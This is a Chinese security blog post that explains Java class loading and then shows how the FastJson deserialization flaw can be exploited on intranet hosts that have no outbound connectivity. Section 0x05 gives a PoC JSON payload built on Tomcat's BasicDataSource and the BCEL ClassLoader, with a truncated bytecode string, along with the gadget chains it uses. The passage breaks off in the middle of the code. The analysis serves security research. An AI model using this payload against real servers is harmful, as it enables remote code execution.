<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>Java动态类加载，当FastJson遇到内网 &#8211; KINGX</title>
<meta name="description" content="Exploit FastJson Without Reverse Connect">
<meta name="keywords" content="Java, ClassLoader, FastJson">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kingx.me/images/">
<meta name="twitter:title" content="Java动态类加载，当FastJson遇到内网">
<meta name="twitter:description" content="Exploit FastJson Without Reverse Connect">
<meta name="twitter:creator" content="@https://twitter.com/KINGX_CN">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Java动态类加载，当FastJson遇到内网">
<meta property="og:description" content="Exploit FastJson Without Reverse Connect">
<meta property="og:url" content="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">
<meta property="og:site_name" content="KINGX">





<link rel="canonical" href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">
<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="https://kingx.me/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">




<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>


</head>

<body id="post" >

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="https://kingx.me/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
					<h4>KINGX</h4>
					<p>What is Security</p>
				</li>
				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				<li>
					<a href="https://twitter.com/KINGX_CN"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
				</li>
				<li>
					<a href="https://weibo.com/u/1624430122"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
				</li>
				
				
				
				<li>
					<a href="https://github.com/KINGX-Code"><i class="fa fa-fw fa-github"></i> GitHub</a>
				</li>
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<!-- <li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="https://kingx.me/posts/">All Posts</a></li>
				<li><a href="https://kingx.me/tags/">All Tags</a></li>
			</ul>
		</li> -->
		
	    
	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
	  
	    
	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
	  
	    
	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
	  
	    
	    <li><a href="https://kingx.me/cheatsheet/" >CheatSheet</a></li>
	  
	    
	    <li><a href="https://kingx.me/stop-learning/" >Stop Learning</a></li>
	  
	    
	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
	  
	    
	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
	  
	    
	    <li><a href="https://kingx.me/links/" >Links</a></li>
	  
	    
	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
	  
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->




<div id="main" role="main">
  <article class="hentry">
    <header class="header-title">
      <div class="header-title-wrap">
        
          <h1 class="entry-title"><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" rel="bookmark" title="Java动态类加载，当FastJson遇到内网">Java动态类加载，当FastJson遇到内网</a></h1>
        
        <h2><span class="entry-date date published"><time datetime="2019-12-31T00:00:00-05:00">December 31, 2019, KINGX</time></span></h2>
        
        <p class="entry-reading-time">
          <i class="fa fa-clock-o"></i>
          
Reading time ~5 minutes
          
          <span id="busuanzi_container_page_pv">
             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
          </span>
          
        </p><!-- /.entry-reading-time -->
        

      </div><!-- /.header-title-wrap -->
    </header>
    <div class="entry-content">
      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
      <h2 id="0x00--2019补完">0x00  2019补完</h2>

<p>一晃半年没更了，文章草稿倒是积累了一沓，没太多时间写。然鹅前段时间竟然被在线催更，惭愧，于是决定赶在元旦前把一年以前的草稿给补完了，辞旧迎新。</p>

<p>都快2020年了，平时偶尔还是能遇到一些低版本的FastJson漏洞，现在遇到比较多的是部署在内网服务器上的场景。从外网对漏洞点进行探测，只有DNSLog可以成功请求回来，因为目标服务器没有外网、无法反连，自然就用不了JNDI注入的利用方式。那是不是就无法深入利用了呢？又如何向业务方证明这里的危害，今天我们借这个例子讲一下Java的动态类加载的机制。</p>

<p>（想了解FastJson内网利用方式的可以直接跳到0x05小节</p>

<h2 id="0x01--java类加载器classloader">0x01  Java类加载器：ClassLoader</h2>

<p>我们通常会把编程语言的处理器分为<code class="highlighter-rouge">解释器</code>和<code class="highlighter-rouge">编译器</code>。解释器是一种用于执行程序的软件，它会根据程序代码中的算法执行运算，如果这个执行软件是根据虚拟的或者类似机器语言的程序设计语言写成，那也称为虚拟机。编译器则是将某种语言代码转换为另外一种语言的程序，通常会转换为机器语言。</p>

<p>有些编程语言会混用解释器和编译器，比如Java会先通过编译器将源代码转换为Java二进制代码（字节码），并将这种虚拟的机器语言保存在文件中（通常是.class文件），之后通过Java虚拟机（JVM）的解释器来执行这段代码。</p>

<p>Java是面向对象的语言，字节码中包含了很多Class信息。在 JVM 解释执行的过程中，ClassLoader就是用来加载Java类的，它会将Java字节码中的Class加载到内存中。而每个 Class 对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="o">{</span>
 
    <span class="o">...</span>
    <span class="kd">private</span> <span class="nf">Class</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Initialize final field for classLoader.  The initialization value of non-null</span>
      <span class="c1">// prevents future JIT optimizations from assuming this final field is null.</span>
      <span class="n">classLoader</span> <span class="o">=</span> <span class="n">loader</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="o">...</span>
    <span class="kd">private</span> <span class="kd">final</span> <span class="n">ClassLoader</span> <span class="n">classLoader</span><span class="o">;</span>

    <span class="o">...</span>
 
<span class="o">}</span>
</code></pre></div></div>

<p>ClassLoader类位于java.lang.ClassLoader，官方描述是这样的：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * A class loader is an object that is responsible for loading classes. The
 * class &lt;tt&gt;ClassLoader&lt;/tt&gt; is an abstract class.  Given the &lt;a
 * href="#name"&gt;binary name&lt;/a&gt; of a class, a class loader should attempt to
 * locate or generate data that constitutes a definition for the class.  A
 * typical strategy is to transform the name into a file name and then read a
 * "class file" of that name from a file system.
 *
 * ...
 *
 * &lt;p&gt; The &lt;tt&gt;ClassLoader&lt;/tt&gt; class uses a delegation model to search for
 * classes and resources.  Each instance of &lt;tt&gt;ClassLoader&lt;/tt&gt; has an
 * associated parent class loader.  When requested to find a class or
 * resource, a &lt;tt&gt;ClassLoader&lt;/tt&gt; instance will delegate the search for the
 * class or resource to its parent class loader before attempting to find the
 * class or resource itself.  The virtual machine's built-in class loader,
 * called the "bootstrap class loader", does not itself have a parent but may
 * serve as the parent of a &lt;tt&gt;ClassLoader&lt;/tt&gt; instance.
 *
 * ...
 **/</span>
<span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">ClassLoader</span> <span class="o">{</span>
	<span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<h2 id="0x02--常见的classloader">0x02  常见的ClassLoader</h2>

<p>JDK内置常见的ClassLoader主要有这几个：BootstrapClassLoader、ExtensionClassLoader、AppClassLoader、URLClassLoader、ContextClassLoader。</p>

<p>ClassLoader采用了委派模式（Parents Delegation Model）来搜索类和资源。每一个ClassLoader类的实例都有一个父级ClassLoader，当需要加载类时，ClassLoader实例会委派父级ClassLoader先进行加载，如果无法加载再自行加载。JVM 内置的 BootstrapClassLoader 自身没有父级ClassLoader，而它可以作为其他ClassLoader实例的父级。</p>

<ul>
  <li>
    <p>BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.*.* 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。</p>
  </li>
  <li>
    <p>ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。</p>
  </li>
  <li>
    <p>AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。</p>
  </li>
  <li>
    <p>URLClassLoader，ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。BootstrapClassLoader、ExtClassLoader、AppClassLoader等都是 URLClassLoader 的子类。</p>
  </li>
</ul>

<p>AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，开发者编写代码中的类就是通过AppClassLoader进行加载的，包括 main() 方法中的第一个用户类。</p>

<p>我们可以运行如下代码查看ClassLoader的委派关系：</p>

<blockquote>
  <p>ClassLoader.getParent() 可以获取用于委派的父级class loader，通常会返回null来表示bootstrap class loader。</p>
</blockquote>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">JavaClassLoader</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ClassLoader</span> <span class="n">appClassloader</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">();</span>
        <span class="n">ClassLoader</span> <span class="n">extensionClassloader</span> <span class="o">=</span> <span class="n">appClassloader</span><span class="o">.</span><span class="na">getParent</span><span class="o">();</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"AppClassLoader is "</span> <span class="o">+</span> <span class="n">appClassloader</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"The parent of AppClassLoader is "</span> <span class="o">+</span> <span class="n">extensionClassloader</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"The parent of ExtensionClassLoader is "</span> <span class="o">+</span> <span class="n">extensionClassloader</span><span class="o">.</span><span class="na">getParent</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>执行结果：</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2
The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@5e2de80c
The parent of ExtensionClassLoader is null

</code></pre></div></div>

<p>而 ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。</p>

<p>ExtClassLoader 和 AppClassLoader 类的实现代码位于rt.jar 中的 sun.misc.Launcher 类中，Launcher是由BootstrapClassLoader加载的。ExtClassLoader 和 AppClassLoader 定义如下：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">static</span> <span class="kd">class</span> <span class="nc">ExtClassLoader</span> <span class="kd">extends</span> <span class="n">URLClassLoader</span> <span class="o">{</span>
	<span class="kd">private</span> <span class="kd">static</span> <span class="kd">volatile</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">ExtClassLoader</span> <span class="n">instance</span><span class="o">;</span>

	<span class="kd">public</span> <span class="kd">static</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">ExtClassLoader</span> <span class="nf">getExtClassLoader</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">instance</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Class</span> <span class="n">var0</span> <span class="o">=</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">ExtClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
        <span class="kd">synchronized</span><span class="o">(</span><span class="n">Launcher</span><span class="o">.</span><span class="na">ExtClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">instance</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">instance</span> <span class="o">=</span> <span class="n">createExtClassLoader</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">instance</span><span class="o">;</span>
<span class="o">}</span>

<span class="o">...</span>

<span class="kd">static</span> <span class="kd">class</span> <span class="nc">AppClassLoader</span> <span class="kd">extends</span> <span class="n">URLClassLoader</span> <span class="o">{</span>
	<span class="kd">final</span> <span class="n">URLClassPath</span> <span class="n">ucp</span> <span class="o">=</span> <span class="n">SharedSecrets</span><span class="o">.</span><span class="na">getJavaNetAccess</span><span class="o">().</span><span class="na">getURLClassPath</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>

	<span class="kd">public</span> <span class="kd">static</span> <span class="n">ClassLoader</span> <span class="nf">getAppClassLoader</span><span class="o">(</span><span class="kd">final</span> <span class="n">ClassLoader</span> <span class="n">var0</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="kd">final</span> <span class="n">String</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"java.class.path"</span><span class="o">);</span>
    <span class="kd">final</span> <span class="n">File</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">var1</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="k">new</span> <span class="n">File</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">:</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">getClassPath</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
    <span class="k">return</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span><span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span>
    	<span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">&lt;</span><span class="n">Launcher</span><span class="o">.</span><span class="na">AppClassLoader</span><span class="o">&gt;()</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">AppClassLoader</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="n">URL</span><span class="o">[]</span> <span class="n">var1x</span> <span class="o">=</span> <span class="n">var1</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">:</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">pathToURLs</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">Launcher</span><span class="o">.</span><span class="na">AppClassLoader</span><span class="o">(</span><span class="n">var1x</span><span class="o">,</span> <span class="n">var0</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">});</span>
<span class="o">}</span>
</code></pre></div></div>

<h2 id="0x03--loadclassfindclassdefineclass">0x03  loadClass()、findClass()、defineClass()</h2>

<p>ClassLoader 中有几个重要的方法：loadClass()、findClass()、defineClass()。ClassLoader 尝试定位或者产生一个Class的数据，通常是把二进制名字转换成文件名然后到文件系统中找到该文件。</p>

<ul>
  <li>
    <p>loadClass(String classname)，参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用loadClass()，如果都没找到则调用findClass()。</p>
  </li>
  <li>
    <p>findClass()，搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。</p>
  </li>
  <li>
    <p>defineClass()，将字节码转换为 JVM 的 java.lang.Class 对象。</p>
  </li>
</ul>

<h2 id="0x04--classforname">0x04  Class.forName()</h2>

<p>Class.forName() 也可以用来动态加载指定的类，它会返回一个指定类/接口的 Class 对象，如果没有指定ClassLoader， 那么它会使用BootstrapClassLoader来进行类的加载。该方法定义如下：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">initialize</span><span class="o">,</span> <span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span>
  
<span class="kd">public</span> <span class="kd">static</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span>
</code></pre></div></div>

<p>Class.forName() 和 ClassLoader.loadClass() 这两个方法都可以用来加载目标类，但是都不支持加载原生类型，比如：int。Class.forName() 可以加载数组，而 ClassLoader.loadClass() 不能。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 动态加载 int 数组</span>

<span class="n">Class</span> <span class="n">ia</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"[I"</span><span class="o">);</span>
<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">ia</span><span class="o">);</span>

<span class="c1">// 会输出：</span>
<span class="c1">// class [I</span>

<span class="n">Class</span> <span class="n">ia2</span> <span class="o">=</span>  <span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"[I"</span><span class="o">);</span> 

<span class="c1">// 数组类型不能使用ClassLoader.loadClass方法，会报错：</span>
<span class="c1">// Exception in thread "main" java.lang.ClassNotFoundException: [I</span>

</code></pre></div></div>

<p>Class.forName()方法实际上也是调用的 CLassLoader 来实现的，调用时也可以在参数中明确指定ClassLoader。与ClassLoader.loadClass() 一个小小的区别是，forName() 默认会对类进行初始化，会执行类中的 static 代码块。而ClassLoader.loadClass() 默认并不会对类进行初始化，只是把类加载到了 JVM 虚拟机中。</p>

<p>我们执行如下测试代码：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">Test</span><span class="o">{</span>

    <span class="kd">static</span><span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"// This is static code executed"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JavaClassLoader</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
        <span class="n">ClassLoader</span> <span class="n">appClassloader</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">();</span>      
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Execute Class.forName:"</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">cl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"Test"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cl</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Execute ClassLoader:"</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">cl2</span> <span class="o">=</span> <span class="n">appClassloader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"Test"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cl2</span><span class="o">);</span>

    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>执行结果如下，可以看到Class.forName()时，static代码块被执行了：</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Execute Class.forName:
// This is static code executed
class Test
Execute ClassLoader:
class Test
</code></pre></div></div>

<h2 id="0x05-fastjson内网利用">0x05 FastJson内网利用</h2>

<p>还记得FastJson TemplatesImpl利用链吗 ？</p>

<p>TemplatesImpl.getOutputProperties() 
    &gt; TemplatesImpl.newTransformer() 
        &gt; TemplatesImpl.getTransletInstance()
            &gt; TemplatesImpl.defineTransletClasses()</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">defineTransletClasses</span><span class="o">()</span>
<span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>

    <span class="o">...</span>
            <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">(</span><span class="n">_bytecodes</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
            <span class="kd">final</span> <span class="n">Class</span> <span class="n">superClass</span> <span class="o">=</span> <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getSuperclass</span><span class="o">();</span>

            <span class="c1">// Check if this is the main class</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">superClass</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ABSTRACT_TRANSLET</span><span class="o">))</span> <span class="o">{</span>
    <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>这个PoC原理上也是利用了 ClassLoader 动态加载恶意代码，在Payload中直接传入字节码。TransletClassLoader.defineClass() 将 Bytecode 字节码转为Class对象。但是这种限制比较多，要求开发者在调用parseObject()时额外设置 Feature.SupportNonPublicField，这是不太常见的使用场景。</p>

<p>其实在2017年FastJson漏洞刚公布出来的时候，我们就很快捕获到了一个比较通用的Exploit，它利用了org.apache.tomcat.dbcp.dbcp.BasicDataSource类。这个Payload不需要反连，不要求特定的代码写法，直接传入恶意代码bytecode完成利用，而且依赖包 tomcat-dbcp 使用也比较广泛，是Tomcat的数据库驱动组件。但是网上对这个PoC的分析文章并不是很多，印象中只有genxor在&lt;DefineClass在Java反序列化当中的利用&gt;一文中有较为完整的分析。PoC如下：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="s2">"x"</span><span class="p">:{</span><span class="w">
                </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="p">,</span><span class="w">
                </span><span class="s2">"driverClassLoader"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span><span class="w">
                </span><span class="p">},</span><span class="w">
                </span><span class="s2">"driverClassName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$$BCEL$$$l$8b$I$A$..."</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}:</span><span class="w"> </span><span class="s2">"x"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>这里反序列化生成了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并完成了命令执行。直接看利用链：</p>

<p>BasicDataSource.getConnection()
    &gt; createDataSource()
​        &gt; createConnectionFactory()</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="n">ConnectionFactory</span> <span class="nf">createConnectionFactory</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>

    <span class="o">...</span>
   
	<span class="k">if</span> <span class="o">(</span><span class="n">driverClassLoader</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
			<span class="n">driverFromCCL</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">driverClassName</span><span class="o">);</span>
	<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
			<span class="n">driverFromCCL</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">driverClassName</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">driverClassLoader</span><span class="o">);</span>
	<span class="o">}</span>
    <span class="o">...</span>
</code></pre></div></div>

<p>经过一连串的调用链，在 BasicDataSource.createConnectionFactory() 中会调用 Class.forName()，还可以自定义ClassLoader。如上一节所说 Class.forName() 在动态加载类时，默认会进行初始化，所以这里在动态加载的过程中会执行 static 代码段。</p>

<p>那么在可控 classname 和 classloader 的情况下，如何实现命令执行呢？</p>

<p>接下来不得不提这个PoC中的 com.sun.org.apache.bcel.internal.util.ClassLoader 了，这是一个神奇的 ClassLoader，因为它会直接从 classname 中提取 Class 的 bytecode 数据。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="n">Class</span> <span class="nf">loadClass</span><span class="o">(</span><span class="n">String</span> <span class="n">class_name</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">resolve</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span>
<span class="o">{</span>
    <span class="o">...</span>
    
    <span class="k">if</span><span class="o">(</span><span class="n">class_name</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"$$BCEL$$"</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span>
          <span class="n">clazz</span> <span class="o">=</span> <span class="n">createClass</span><span class="o">(</span><span class="n">class_name</span><span class="o">);</span>
    <span class="k">else</span> <span class="o">{</span> 
      <span class="o">...</span>
    <span class="o">}</span>

